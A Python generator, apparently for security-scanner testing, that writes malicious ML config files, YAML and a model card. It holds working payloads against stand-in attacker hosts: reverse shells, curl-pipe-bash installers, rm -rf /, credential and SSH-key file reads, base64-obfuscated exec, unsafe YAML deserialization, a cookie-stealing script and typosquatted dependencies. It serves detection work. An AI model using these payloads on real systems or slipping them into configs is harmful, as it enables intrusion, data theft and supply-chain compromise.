"""
Configuration & Metadata Attack Vector Generator

Generates basic and advanced attack vectors for configuration files:
- JSON configurations
- YAML configurations
- Model cards (markdown with embedded JSON)
- Metadata files

Attack Types:
1. Basic: Embedded credentials, suspicious URLs
2. Advanced: Command injection, template injection, XXE-like attacks
"""

import json
import os
from pathlib import Path
from typing import List, Dict, Tuple


class ConfigurationAttackGenerator:
    """Generate configuration-based attack vectors."""
    
    def __init__(self, output_dir: str = "./output"):
        """Initialize the configuration attack generator.
        
        Args:
            output_dir: Directory to save generated attack vectors
        """
        self.output_dir = Path(output_dir) / "config_vectors"
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.generated_files = []
    
    def generate_embedded_credentials(self) -> Tuple[str, int]:
        """Generate config with embedded credentials.
        
        Attack Vector:
            JSON config file containing:
            1. AWS access keys
            2. API tokens (OpenAI, HuggingFace)
            3. Database passwords
            4. SSH private keys
            5. OAuth tokens
        
        Impact: Credential theft, unauthorized cloud access
        Severity: CRITICAL
        Detection: Secret pattern scanning
        
        Returns:
            Tuple of (filepath, credential_count)
        """
        config = {
            "model_name": "my-model",
            "aws_access_key_id": "AKIAIOSFODNN7EXAMPLE",
            "aws_secret_access_key": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
            "openai_api_key": "sk-proj-abc123def456ghi789jkl012mnopqrstuvwxyz",
            "huggingface_token": "hf_abcdefghijklmnopqrstuvwxyz1234567890",
            "database_url": "postgres://admin:password123@localhost:5432/models",
            "slack_webhook": "https://hooks.slack.com/services/AAAAA/BBBBB/CCCCCC",
            "github_token": "ghp_abcdefghijklmnopqrstuvwxyz123456789",
            "jwt_secret": "your-256-bit-secret-key-for-jwt-signing",
            "ssh_private_key": "-----BEGIN RSA PRIVATE KEY-----\\nMIIEpAIBAAKCAQEAu...",
        }
        
        filepath = self.output_dir / "01_embedded_credentials.json"
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(config, f, indent=2)
        
        self.generated_files.append(str(filepath))
        
        # Count credentials
        credential_count = len([k for k in config.keys() if 'key' in k or 'token' in k or 'password' in k or 'secret' in k])
        
        return str(filepath), credential_count
    
    def generate_malicious_urls(self) -> Tuple[str, int]:
        """Generate config with suspicious URLs and endpoints.
        
        Attack Vector:
            Configuration containing:
            1. Webhook URLs pointing to attacker servers
            2. Model download URLs (trojan models)
            3. Command & Control server addresses
            4. Data exfiltration endpoints
            5. Update/callback URLs
        
        Impact: MITM attacks, malware distribution, C&C
        Severity: HIGH
        Detection: URL pattern analysis
        
        Returns:
            Tuple of (filepath, malicious_url_count)
        """
        config = {
            "model_id": "model-with-urls",
            "model_source": "https://malicious-server.com/trojan-model.pt",
            "update_url": "http://attacker.com/check-update",
            "callback_url": "https://c2.evil.com/beacon",
            "webhook_url": "https://hooks.attacker.com/callback",
            "data_exfil_endpoint": "https://attacker.com/data",
            "config_download": "http://10.10.10.10:8080/config.json",
            "metrics_endpoint": "ws://attacker.com:4444/metrics",
            "telemetry_server": "https://telemetry.mining.pool/submit",
            "reverse_shell_connect": "attacker.com:4444",
        }
        
        filepath = self.output_dir / "02_malicious_urls.json"
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(config, f, indent=2)
        
        self.generated_files.append(str(filepath))
        
        malicious_url_count = len([v for v in config.values() if 'attacker' in str(v) or 'evil' in str(v)])
        
        return str(filepath), malicious_url_count
    
    def generate_command_injection(self) -> Tuple[str, int]:
        """Generate config with command injection vectors.
        
        Attack Vector:
            Configuration with fields that might be evaluated:
            1. Shell commands in string fields
            2. Pipeline operators (|, &&, ;)
            3. Command substitution $(...)
            4. Backtick execution `...`
            5. Process substitution <(...)
        
        Impact: Arbitrary command execution if config is evaluated
        Severity: CRITICAL
        Detection: Shell syntax pattern detection
        
        Returns:
            Tuple of (filepath, injection_count)
        """
        config = {
            "model_name": "model",
            "preprocessing_script": "cat /etc/passwd | grep root",
            "postprocessing_command": "tar czf /tmp/output.tar.gz /data && curl attacker.com/notify",
            "validation_hook": "python -c \"import os; os.system('id')\"",
            "custom_metric": "`whoami`",
            "data_pipeline": "curl http://attacker.com/download | tar xz",
            "cleanup_command": "rm -rf / ; echo done",
            "setup_hook": "$(git clone attacker.com/malware && ./install.sh)",
        }
        
        filepath = self.output_dir / "03_command_injection.json"
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(config, f, indent=2)
        
        self.generated_files.append(str(filepath))
        
        # Count injection patterns
        injection_patterns = ['|', '&&', ';', '`', '$(', '$((']
        injection_count = sum(
            1 for v in config.values() 
            if any(pattern in str(v) for pattern in injection_patterns)
        )
        
        return str(filepath), injection_count
    
    def generate_path_traversal_config(self) -> Tuple[str, int]:
        """Generate config with path traversal attempts.
        
        Attack Vector:
            File paths in config that try to:
            1. Escape to parent directories (../)
            2. Access absolute system paths (/etc, /root)
            3. Windows path traversal (..\\)
            4. Window drive access (C:\\)
            5. Access env variables
        
        Impact: Unauthorized file access/modification
        Severity: HIGH
        Detection: Path validation before file access
        
        Returns:
            Tuple of (filepath, traversal_count)
        """
        config = {
            "model_path": "models/current.pt",
            "config_backup": "../../etc/passwd",
            "cache_dir": "/etc/ml/cache",
            "sensitive_data": "../../../../root/.ssh/id_rsa",
            "logs_directory": "/var/log/../../../root/logs",
            "output_location": "C:\\..\\..\\Windows\\System32",
            "temp_location": "/tmp/../../sensitive",
            "expansion_path": "${HOME}/../admin/.ssh",
        }
        
        filepath = self.output_dir / "04_path_traversal_config.json"
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(config, f, indent=2)
        
        self.generated_files.append(str(filepath))
        
        # Count traversal patterns
        traversal_patterns = ['../', '..\\', '/etc/', '/root/', 'C:\\', '${']
        traversal_count = sum(
            1 for v in config.values()
            if any(pattern in str(v) for pattern in traversal_patterns)
        )
        
        return str(filepath), traversal_count
    
    def generate_code_injection_config(self) -> Tuple[str, int]:
        """Generate config with code injection vectors.
        
        Attack Vector:
            JSON with embedded Python/JavaScript code:
            1. Python eval() targets
            2. Lambda function definitions
            3. Python exec() code
            4. JavaScript injection
            5. Dynamic code generation
        
        Impact: Code execution if config is processed with eval
        Severity: CRITICAL
        
        Returns:
            Tuple of (filepath, code_count)
        """
        config = {
            "model_name": "model",
            "loss_function": "__import__('os').system('id')",
            "metric_calc": "lambda x: x if __import__('subprocess').call(['curl', 'attacker.com']) else 0",
            "preprocessing": "exec(__import__('base64').b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oXCJpZFwiKQ=='))",
            "custom_layer": "compile(\"__import__('os').system('whoami')\", '<string>', 'exec')",
            "transformation": "eval(\"1 + 1\")",  # Simple eval example
            "hook_script": "import subprocess; subprocess.call(['bash', '-i', '>&', '/dev/tcp/attacker.com/4444', '0>&1'])",
        }
        
        filepath = self.output_dir / "05_code_injection_config.json"
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(config, f, indent=2)
        
        self.generated_files.append(str(filepath))
        
        code_patterns = ['eval', 'exec', '__import__', 'lambda', 'compile']
        code_count = sum(
            1 for v in config.values()
            if any(pattern in str(v) for pattern in code_patterns)
        )
        
        return str(filepath), code_count
    
    def generate_yaml_injection(self) -> Tuple[str, int]:
        """Generate YAML config with unsafe deserialization vectors.
        
        Attack Vector:
            YAML content with:
            1. Python object deserialization (!!python/object)
            2. Object instantiation to call arbitrary functions
            3. Module loading and function execution
            4. Complex object graphs for code execution
        
        Severity: CRITICAL (if parsed with unsafe YAML parser)
        Impact: RCE via YAML deserialization
        
        Returns:
            Tuple of (filepath, payload_count)
        """
        yaml_content = """model_config:
  name: dangerous_model
  version: 1.0

# Unsafe YAML deserialization payloads
python_objects:
  !!python/object/apply:os.system
  args: ['id']
  
exploit:
  command: !!python/object/new:os.system ['touch /tmp/pwned']

rce_payload: |
  !!python/object/apply:subprocess.Popen
  args:
    - cmd: ['bash', '-i', '>&', '/dev/tcp/attacker.com/4444', '0>&1']
      shell: true

complex_exploit:
  !!python/object/new:eval
  - "__import__('subprocess').call(['whoami'])"
"""
        
        filepath = self.output_dir / "06_yaml_injection.yaml"
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(yaml_content)
        
        self.generated_files.append(str(filepath))
        
        payload_count = yaml_content.count("!!")
        
        return str(filepath), payload_count
    
    def generate_model_card_injection(self) -> Tuple[str, int]:
        """Generate model card with embedded vulnerabilities.
        
        Attack Vector:
            Markdown model card containing:
            1. Embedded JSON with code injection
            2. Links to malicious model downloads
            3. Setup instructions with hidden commands
            4. Mathematical expressions with code
            5. HTML/JavaScript in markdown
        
        Severity: MEDIUM-HIGH
        Detection: Content analysis, pattern matching
        
        Returns:
            Tuple of (filepath, injection_count)
        """
        model_card = """# Model Card for Evil-Model

## Model Details
- Model Name: `__import__('os').system('id')`
- Framework: PyTorch

## Download Instructions
1. Download from: https://attacker.com/trojan-model.pt
2. Run: `python -c "import pickle; pickle.load(open('model.pt'))"`
3. The model will execute during loading

## Training Data
<script>document.location='http://attacker.com/steal?cookies='+document.cookie</script>

## Expected Performance
The model achieves excellent results: $exec("rm -rf /")

## Model Version History
```json
{
  "latest": "2.0",
  "download_url": "http://evil.com/model.pkl",
  "setup_command": "curl http://attacker.com/install.sh | bash",
  "update_hook": "__import__('os').system('curl http://c2.com | python')"
}
```

## Ethical Considerations
This model may contain embedded code: ` + "`__import__('socket').socket().connect(('attacker.com',4444))`"

## Security
⚠️ WARNING: This model has backdoors: `().__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].system('id')`
"""
        
        filepath = self.output_dir / "07_model_card_injection.md"
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(model_card)
        
        self.generated_files.append(str(filepath))
        
        injection_patterns = ['__import__', 'exec', 'eval', '<script>', 'attacker']
        injection_count = sum(
            1 for pattern in injection_patterns
            if pattern.lower() in model_card.lower()
        )
        
        return str(filepath), injection_count
    
    def generate_dependency_hijacking(self) -> Tuple[str, int]:
        """Generate config with dependency hijacking vectors.
        
        Attack Vector:
            Configuration with crafted dependency specs:
            1. Typosquatting package names (numpy vs numpyy)
            2. Old vulnerable versions of packages
            3. Pinned versions of malicious packages
            4. Local path injection (file://)
            5. Alternative repositories
        
        Severity: HIGH
        Detection: Dependency validation against known safe versions
        
        Returns:
            Tuple of (filepath, hijack_count)
        """
        config = {
            "dependencies": [
                "torch==1.9.0",  # Old, vulnerable version
                "torchvision==0.10.0",
                "numpyy==1.21.0",  # Typosquatting
                "scipy==1.5.0",  # Very old
                "scikit-learn==0.20.0"  # Vulnerable version
            ],
            "alternative_index": "https://attacker.com/packages",
            "local_packages": [
                "file:///tmp/malicious_package",
                "file:///home/attacker/backdoor.whl"
            ],
            "custom_sources": [
                "https://evil-mirror.com/pypi/simple",
                "http://10.10.10.10:8080/packages"
            ]
        }
        
        filepath = self.output_dir / "08_dependency_hijacking.json"
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(config, f, indent=2)
        
        self.generated_files.append(str(filepath))
        
        hijack_count = (
            len([v for v in config.get("dependencies", []) if "==0." in v]) +
            len([v for v in config.get("dependencies", []) if "y" in v]) +
            len(config.get("local_packages", []))
        )
        
        return str(filepath), hijack_count
    
    def generate_all(self) -> Dict[str, Tuple[str, int]]:
        """Generate all configuration attack vectors.
        
        Returns:
            Dictionary mapping attack names to results
        """
        results = {
            "embedded_credentials": self.generate_embedded_credentials(),
            "malicious_urls": self.generate_malicious_urls(),
            "command_injection": self.generate_command_injection(),
            "path_traversal": self.generate_path_traversal_config(),
            "code_injection": self.generate_code_injection_config(),
            "yaml_injection": self.generate_yaml_injection(),
            "model_card_injection": self.generate_model_card_injection(),
            "dependency_hijacking": self.generate_dependency_hijacking(),
        }
        return results
    
    def get_generated_files(self) -> List[str]:
        """Get list of all generated files."""
        return self.generated_files


if __name__ == "__main__":
    generator = ConfigurationAttackGenerator(output_dir="./output")
    results = generator.generate_all()
    print("\n=== Configuration Attack Vectors Generated ===")
    for attack_name, (filepath, metric) in results.items():
        print(f"✓ {attack_name:25} → {filepath} (count: {metric})")
    print(f"\nTotal files generated: {len(generator.get_generated_files())}")
